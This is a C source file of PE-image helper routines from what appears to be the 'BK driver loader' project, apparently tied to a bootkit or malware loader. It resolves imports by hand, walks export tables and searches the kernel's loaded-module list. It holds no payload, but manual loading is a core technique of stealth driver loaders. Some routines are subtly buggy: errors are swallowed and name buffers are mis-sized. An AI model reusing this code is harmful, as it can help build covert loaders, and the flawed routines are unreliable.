//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: pesup.h
// $Revision: 84 $
// $Date: 2012-07-20 17:16:28 +0400 (Пт, 20 июл 2012) $
// description: 
//	BK helper library. PE-structure support routines.
//	Working with PE image structure here. Resolving image import and searching for an export.

#include "main.h"
#include "pesup.h"
#include "crtsup.h"

#define  MAX_DLL_NAME	0x40	// bytes

//	Pointer to the list of loded modules. Used by PeSupGetModuleBase function. Must be initialized by the caller.
PLIST_ENTRY	PeSupLoadedModuleList = NULL;


static NTSTATUS ImportScanLoop(
					PCHAR	ModuleBase, 
					ULONG	SizeOfImage,
					PVOID	ImportedModuleBase,
					ULONG   rvaINT,
					ULONG   rvaIAT
					)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_BY_NAME   pOrdinalName;
	PIMAGE_THUNK_DATA		pINT;
	PIMAGE_THUNK_DATA		pIAT;
	IAT_ENTRY				IatEntry;

	if ( rvaINT == 0 )   // No Characteristics field?
	{	
		// Yes! Gotta have a non-zero FirstThunk field then.
		rvaINT = rvaIAT;
	     
		if ( rvaINT == 0 )   // No FirstThunk field?  Ooops!!!
			return(STATUS_INVALID_IMAGE_FORMAT);
	}
        
	// Adjust the pointer to point where the tables are in the
	// mem mapped file.
	pINT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaINT, ModuleBase);
	if (!pINT )
		return(STATUS_INVALID_IMAGE_FORMAT);
		
	pIAT = (PIMAGE_THUNK_DATA)PeSupRvaToVa(rvaIAT, ModuleBase);

	while (TRUE) // Loop forever (or until we break out)
	{
		if ( pINT->u1.AddressOfData == 0 )
			break;

		if ( IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal) == FALSE)
		{
			pOrdinalName = (PIMAGE_IMPORT_BY_NAME)PeSupRvaToVa((ULONG)pINT->u1.AddressOfData, ModuleBase);
		}
		else if( pINT->u1.Ordinal >= (ULONG_PTR)ModuleBase &&
		 	 pINT->u1.Ordinal < ((ULONG_PTR)ModuleBase + SizeOfImage))
		{
			pOrdinalName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pINT->u1.AddressOfData);
		}
		else
			pOrdinalName = NULL;


		if (pOrdinalName)
		{
			if (IatEntry = (IAT_ENTRY)PeSupGetFunctionAddress(ImportedModuleBase, (PCHAR)&pOrdinalName->Name))
			{
				pIatEntry = &pIAT->u1.Function;
				*pIatEntry = IatEntry;
			}
			else
			{
				ntStatus = STATUS_PROCEDURE_NOT_FOUND;
				break;
			}
		}	// if (pOrdinalName)

		pINT++;         // advance to next thunk
		pIAT++;         // advance to next thunk
	} // while (TRUE)	

	return(ntStatus);
}


//
//	Resolves specified image import based on the specified list of loaded modules.
//
NTSTATUS	PeSupResolveImageImport(
	PVOID	ImageBase,
	PPE_GET_MODULE_BASE	GetModuleBase
	)
{
	ULONG   importsStartRVA;
	PCHAR   ModuleName;
	PCHAR	ModuleBase = (PCHAR)ImageBase;
	PVOID	ImportedModuleBase = NULL;
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	PIAT_ENTRY	pIatEntry = NULL;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;


	PIMAGE_NT_HEADERS	PEHeader = (PIMAGE_NT_HEADERS)PeSupGetImagePeHeader(ModuleBase);

	// Get the import table RVA from the data dir
	importsStartRVA = 
		PEHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if ( !importsStartRVA )
		return(STATUS_INVALID_PARAMETER);

	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)PeSupRvaToVa(importsStartRVA, ModuleBase);

	if ( !pImportDesc )
		return(STATUS_INVALID_PARAMETER);

	// Find the import descriptor containing references to callee's functions
	for (; pImportDesc->Name; pImportDesc++) 
	{		
		if (ModuleName = (PCHAR)PeSupRvaToVa(pImportDesc->Name, ModuleBase))
		{
			if (GetModuleBase == NULL)
				ImportedModuleBase = PeSupGetModuleBase(ModuleName);
			else
				ImportedModuleBase = (GetModuleBase)(ModuleName);

			if (ImportedModuleBase)
			{
				ntStatus = ImportScanLoop(ModuleBase, PEHeader->OptionalHeader.SizeOfImage, ImportedModuleBase, 
					pImportDesc->OriginalFirstThunk, pImportDesc->FirstThunk);

				if (!(NT_SUCCESS(ntStatus)))
					break;
			}	// if (ImportedModuleBase)
			else
			{
				ntStatus = STATUS_INVALID_IMPORT_OF_NON_DLL;
				break;

			}
		} // if(ModuleName = (PCHAR)PeSupRvaToVa
	} // for (; pImportDesc->Name; pImportDesc++) 

	return(STATUS_SUCCESS);
}


//
//	Searches for the export table entry of the specified function within the specified module. 
//	Returns pointer to the found entry or NULL if there is no such function within module's export.
//
PEXPORT_ENTRY	PeSupGetExportEntry( 
	PVOID	TargetModule,		// Image base of the target module (where exported function located)
	PCHAR   ExportedFunction	// exported function name
	)
{
	PIMAGE_DATA_DIRECTORY	pExportData;
	PIMAGE_EXPORT_DIRECTORY pExportDir;
	PCHAR	ModuleBase = (PCHAR)TargetModule;
	PULONG  ppFunctions, ppNames;
	PUSHORT pOrdinals;
	ULONG	i, NumberOfNames;
	PEXPORT_ENTRY	pFoundEntry	= NULL;


	pExportData = PeSupGetDirectoryEntryPtr((PIMAGE_NT_HEADERS)(ModuleBase + ((PIMAGE_DOS_HEADER)TargetModule)->e_lfanew), IMAGE_DIRECTORY_ENTRY_EXPORT);
	pExportDir = (PIMAGE_EXPORT_DIRECTORY)(ModuleBase + pExportData->VirtualAddress);

	if (pExportData->VirtualAddress == 0 || pExportData->Size == 0 || pExportDir->AddressOfFunctions == 0 || pExportDir->AddressOfNames == 0 )
		return NULL;

	// Get names, functions and ordinals arrays pointers
	ppFunctions =	(PULONG) (ModuleBase + (ULONG)pExportDir ->AddressOfFunctions);
	ppNames =		(PULONG) (ModuleBase + (ULONG)pExportDir ->AddressOfNames);
	pOrdinals =		(PUSHORT)(ModuleBase + (ULONG)pExportDir ->AddressOfNameOrdinals);

	NumberOfNames = pExportDir->NumberOfNames;

	// Walk the export table entries
	for ( i = 0; i < NumberOfNames; ++i )
	{
		// Check if function name matches current entry
		if   (!__strcmp(ModuleBase + *ppNames, ExportedFunction))
		{
			pFoundEntry = (PEXPORT_ENTRY)&ppFunctions [*pOrdinals];
			break;
		}
		ppNames++;
		pOrdinals++;
	}

	return(pFoundEntry);
}


//				
// Retrieves the address of an exported function or variable from the specified module.
//
PVOID	PeSupGetFunctionAddress(
	PVOID	ImageBase,			// target module base
	PCHAR	FunctionName		// target function name
	)
{
	PVOID			Address = NULL;
	PEXPORT_ENTRY	pExportEntry = {0};
	PIMAGE_DATA_DIRECTORY pExportData;

	pExportData = PeSupGetDirectoryEntryPtr((PIMAGE_NT_HEADERS)((PCHAR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew), IMAGE_DIRECTORY_ENTRY_EXPORT);

	if (pExportEntry = PeSupGetExportEntry(ImageBase, FunctionName))
	{
		Address = (PVOID)((PCHAR)ImageBase + *pExportEntry);

	}	// if (pExportEntry = PeSupGetExportEntry(ImageBase, FunctionName))

	return(Address);
}


//
// Retrieves a module base for the specified module from the specified list of loaded modules.
//
PVOID	PeSupGetModuleBase(
	PCHAR	ModuleName
	)
{
	BOOL	Found = FALSE;
	CHAR	ShortName[MAX_DLL_NAME];
	PVOID	ModuleBase = NULL;
	PLIST_ENTRY	pEntry;
	PLDR_DATA_TABLE_ENTRY	LdrEntry;
	ULONG	NameLen = (ULONG)__strlen(ModuleName);
	
	pEntry = PeSupLoadedModuleList->Flink;
	
	while(pEntry != PeSupLoadedModuleList)
	{
		LdrEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (LdrEntry->BaseDllName.Length < MAX_DLL_NAME)
		{
			ULONG i;
			PCHAR Dot;

			for (i=0; i<LdrEntry->BaseDllName.Length; i++)
				ShortName[i] = (CHAR)LdrEntry->BaseDllName.Buffer[i];
			ShortName[NameLen] = 0;

			if (__stricmp(ShortName, ModuleName) == 0)
			{
				Found = TRUE;
				break;
			}
			if (Dot = __strchr(ShortName, '.'))
			{
				Dot[0] = 0;
				if (__stricmp(ShortName, ModuleName) == 0)
				{
					Found = TRUE;
					break;
				}
			}	// if (Dot = strchr(ShortName, '.'))
		}	// if (LdrEntry->BaseDllName.Length < MAX_DLL_NAME)
		pEntry = pEntry->Flink;
	 }	//  while(pEntry != PeSupLoadedModuleList)

	 if (Found)
		 ModuleBase = LdrEntry->DllBase;

	 return(ModuleBase);
 }
